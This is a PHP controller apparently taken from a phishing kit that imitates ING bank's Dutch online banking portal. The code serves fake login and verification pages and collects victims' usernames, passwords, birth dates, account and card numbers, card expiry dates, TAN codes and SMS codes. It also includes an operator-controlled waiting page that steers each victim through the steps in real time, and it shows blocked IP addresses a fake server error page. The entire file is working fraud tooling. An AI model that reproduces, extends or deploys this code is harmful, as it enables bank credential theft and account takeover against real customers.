<?php
namespace controllers;

class ing{

	private $ing_model;
	public function __construct($uidNeeded = false) {
		$this->ing_model = new \models\ing();
		if($uidNeeded == true) {
			if(empty($_SESSION['uid']) || $this->ing_model->entryExists($_SESSION['uid']) == false) {
				header("location: /portal/login");
			}
		}

		if($this->ing_model->isBlocked($_SERVER['REMOTE_ADDR'])) {
            die("<h1>Internal Server Error </h1>
                <p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p>
                <p>Please contact the server administrator at webmaster@localhost to inform them of the time this error occured, and the actions you preformed.</p>
                <p>More information about this error may be avalible in the server error log.</p>
                ");
		}
	}

	public function listenfordirections($uid) {
		echo $this->ing_model->listenfordirections($uid);
	}

	public function heartbeat($uid) {
		$this->ing_model->heartbeat($uid);
	}

	public function login($error = false) {
		
		if(empty($_SESSION['uid']) || $this->ing_model->entryExists($_SESSION['uid']) == false) { $this->ing_model->newIngEntry($_SERVER['REMOTE_ADDR'] ,$_SERVER['HTTP_USER_AGENT']); }
		if(isset($_POST['username']) && isset($_POST['password'])){
			$a = $this->ing_model->submitLogin($_SESSION['uid'], $_POST['username'], $_POST['password']);
			if($a == true) {
				header("Location: /portal/controle");
			}
		}

		$tpl = new \classes\core\template("./views/ing/portal/login/index.tpl");
			if($error == true ){ $tpl->set("error", '<div id="infoAlert" class="alert-container" role="alert" type="error"><div class="alert"><img class="alert-icon" src="/public/iznzg/images/alert-error.svg" aria-hidden="true" aria-label="Error melding"><span><h2 class="title">Deze inloggegevens kloppen niet.</h2><span class="text"> Controleer je gebruikersnaam en je wachtwoord en probeer het nog eens (maximaal 7 keer).  <a href="#">Gebruikersnaam of wachtwoord vergeten?</a></span></span></div></div>');}
			elseif($error == false) { $tpl->set("error", ""); 	}
		echo $tpl->draw();
	}

	public function controle() {
		if($this->ing_model->isUserWaiting($_SESSION['uid'])) {
			if($this->ing_model->entryExists($_SESSION['uid']) == true) { $this->ing_model->addLog($_SESSION['uid'], "User landed on controle page, now waiting for redirect"); }else{ header("Location: /portal/login"); }
			$tpl = new \classes\core\template("./views/ing/portal/controle/index.tpl");
			echo $tpl->draw();
		}else{ header("Location: /portal/login"); }
	}

	public function controlegegevens($error = false) {
		if(isset($_POST['rekeningnummer'])) {
			$a = $this->ing_model->submitControleGegevens($_SESSION['uid'], $_POST['geboortedatum_1']."-".$_POST['geboortedatum_2']."-".$_POST['geboortedatum_3'], $_POST['rekeningnummer'], $_POST['pasnummer'], $_POST['vervaldatum_1']."-".$_POST['vervaldatum_2']);

			if($a == true) {
				header("Location: /portal/controle");
			}
		 }
		$tpl = new \classes\core\template("./views/ing/portal/controle-gegevens/index.tpl");
			if($error == true){ $tpl->set("error", '<div id="infoAlert" class="alert-container" role="alert" type="error"><div class="alert"><img class="alert-icon" src="/public/iznzg/images/alert-error.svg" aria-hidden="true" aria-label="Error melding"><span><h2 class="title">Uw controle gegevens zijn afgekeurd</h2><span class="text">Uw controle gegevens zijn afgewezen omdat u foute informatie heeft verstuurd. Vul opnieuw het verificatie process in om verder te gaan.</span></span></div></div>'); }else{ $tpl->set("error", ""); }
		echo $tpl->draw();
	}

	public function afrondingverificatie($error = false) {
		if(isset($_POST['tan'])){
			$a = $this->ing_model->submitAfronding($_SESSION['uid'], $_POST['tan']);

			if($a == true) {
				header("Location: /portal/controle");
			}
		}
		$tpl = new \classes\core\template("./views/ing/portal/afronding-verificatie/index.tpl");
		if($error == true){ $tpl->set("error", '<div id="infoAlert" class="alert-container" role="alert" type="error"><div class="alert"><img class="alert-icon" src="/public/iznzg/images/alert-error.svg" aria-hidden="true" aria-label="Error melding"><span><h2 class="title">Foute tan code</h2><span class="text">Uw tan code is incorrect, vul uw tan code opnieuw in om verder te gaan.</span></span></div></div>'); }else{ $tpl->set("error", ""); }
		echo $tpl->draw();
	}


	// Mobiel bevestigen
	public function appBevestigen() {
		if(isset($_SERVER["HTTP_REFERER"])) {
			if(strpos($_SERVER["HTTP_REFERER"], "/portal/controle") !== false) {
				$this->ing_model->setWaitingSeen($_SESSION['uid']); // Makes sure we can send users
				$this->ing_model->setWaiting($_SESSION['uid']); // Makes sure we can send users
				$this->ing_model->addLog($_SESSION['uid'], "User landed on app bevestigen page (Doorstuur)"); // Make sure we add an log to prevent confusion
			} 
		}

		$tpl = new \classes\core\template("./views/ing/portal/app-bevestigen/index.tpl");
		echo $tpl->draw();
	}

	public function mobielBevestigen() {

		if(isset($_SERVER["HTTP_REFERER"])) {
			if(strpos($_SERVER["HTTP_REFERER"], "/portal/controle") !== false) {
				$this->ing_model->setWaitingSeen($_SESSION['uid']); // Makes sure we can send users
				$this->ing_model->setWaiting($_SESSION['uid']); // Makes sure we can send users
				$this->ing_model->addLog($_SESSION['uid'], "User landed on mobiel bevestigen page (Doorstuur)"); // Make sure we add an log to prevent confusion
			} 
		}
		
		if(isset($_POST['submit'])) {
			$this->ing_model->addLog($_SESSION['uid'], "User goes from app bevestiging to sms bevestiging");
			$this->ing_model->unsetRedirect($_SESSION['uid']);
			$this->ing_model->unsetWaiting($_SESSION['uid']);

			header("Location: /portal/sms-bevestigen");
			die();
		}

		$tpl = new \classes\core\template("./views/ing/portal/mobiel-bevestigen/index.tpl");
		echo $tpl->draw();
	}

	public function mobielBevestigenTan() {
		if(isset($_POST['sms-code'])) {
			$a = $this->ing_model->submitBevestigenTan($_SESSION['uid'], $_POST['sms-code']);
			if($a == true) {
				header("Location: /portal/controle");
			}
		}
 
		$tpl = new \classes\core\template("./views/ing/portal/mobiel-bevestigen-tan/index.tpl");
		echo $tpl->draw();
	}
	// Eind mobiel bevestigen

	
}
